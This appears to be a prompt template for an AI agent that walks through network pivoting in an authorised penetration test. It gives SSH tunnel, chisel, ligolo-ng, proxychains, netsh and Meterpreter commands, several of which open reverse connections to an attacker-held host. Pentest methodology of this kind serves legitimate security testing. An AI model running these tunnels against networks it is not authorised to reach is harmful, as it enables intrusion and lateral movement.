Network pivoting from: $ARGUMENTS

## Pre-flight
- Map current network position and target network segments
- Identify pivot host capabilities: SSH, outbound ports, installed tools
- Determine firewall rules between network segments
- Verify pivoting is within authorized scope

## Phase 1: SSH Tunneling
1. **Local forward**: `ssh -L 8080:<internal-target>:80 user@pivot` -- access internal:80 via localhost:8080
2. **Remote forward**: `ssh -R 9090:localhost:80 user@pivot` -- expose local:80 on pivot:9090
3. **Dynamic SOCKS**: `ssh -D 1080 user@pivot` -- SOCKS proxy for all traffic
4. **Multi-hop**: `ssh -J user@pivot1 user@pivot2` -- chain through multiple hosts
5. **Config**: Add to ~/.ssh/config for persistent tunnel definitions
6. **Background**: `ssh -f -N -D 1080 user@pivot` -- background without shell

## Phase 2: Chisel
1. **Server** (on attacker): `chisel server --reverse --port 8888`
2. **Client** (on pivot): `chisel client <attacker>:8888 R:socks`
3. **Port forward**: `chisel client <attacker>:8888 R:8080:<internal>:80`
4. **Reverse SOCKS**: traffic flows pivot -> attacker (firewall-friendly)
5. Binary: single static binary, easy to transfer and execute

## Phase 3: Ligolo-ng
1. **Proxy** (attacker): `ligolo-ng -selfcert` -- start proxy server
2. **Agent** (pivot): `agent -connect <attacker>:11601 -ignore-cert`
3. **Add route**: `ip route add <internal-subnet> dev ligolo`
4. **Advantage**: creates TUN interface -- transparent routing without proxychains
5. **Listener**: add listeners for reverse shells from internal network

## Phase 4: Proxychains Configuration
1. Edit `/etc/proxychains4.conf`: set `socks5 127.0.0.1 1080`
2. Use: `proxychains4 nmap -sT -Pn <internal-target>`
3. Chain: `proxychains4 curl http://<internal-target>`
4. Note: only TCP works through SOCKS -- no ICMP/UDP scanning
5. Strict vs dynamic chain: dynamic skips dead proxies

## Phase 5: Windows Pivoting
1. **Netsh**: `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=<internal> connectport=80`
2. **Socat**: `socat TCP-LISTEN:8080,fork TCP:<internal>:80`
3. **Plink**: `plink.exe -ssh -L 8080:<internal>:80 user@attacker`
4. **Meterpreter**: `run autoroute -s <subnet>`, `portfwd add -l 3389 -p 3389 -r <internal>`

## Phase 6: Multi-Hop Pivoting
1. Chain SSH: pivot1 -> pivot2 -> target
2. Nested SOCKS: proxychains through multiple layers
3. Ligolo-ng: multiple agents, route through different interfaces
4. Document each hop: track which tunnel maps to which target

## Tools
SSH, chisel, ligolo-ng, proxychains4, socat, netsh, plink, Meterpreter autoroute

## Output
Save network diagram to engagements/<target>/recon/pivot-map.md

## Framework Mapping
- MITRE ATT&CK: TA0008 (Lateral Movement) -> T1090 (Proxy)
- MITRE ATT&CK: T1090.001 (Internal Proxy), T1090.002 (External Proxy)
- MITRE ATT&CK: TA0008 -> T1021 (Remote Services)
- Cyber Kill Chain: Phase 6 -- Command & Control / Phase 5 -- Installation
- CEH v12: Module 06 -- System Hacking / OSCP Pivoting Methodology

## Safety
Track all tunnels. Clean up port forwards and agents after testing.
